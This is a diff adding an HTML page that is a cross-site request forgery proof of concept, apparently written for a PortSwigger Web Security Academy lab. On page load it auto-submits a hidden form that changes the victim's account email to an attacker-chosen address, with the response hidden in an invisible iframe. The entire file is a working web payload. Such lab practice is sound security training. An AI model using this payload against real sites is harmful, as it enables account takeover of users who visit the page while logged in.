@@ -1,0 +1,10 @@
+<html>
+    <body>
+        <h1>You Hacked :(</h1>
+        <iframe style="display: none;" name="iframe-csrf"></iframe>
+        <form action="https://0af3006d0466f9b3c096539b003c0065.web-security-academy.net/my-account/change-email" method="post" id="csrf-hunter" target="iframe-csrf">
+            <input type="hidden" name="email" value="asd@Cyber-Exp-EG.net">
+        </form>
+        <script>document.getElementById('csrf-hunter').submit()</script>
+    </body>
+</html>
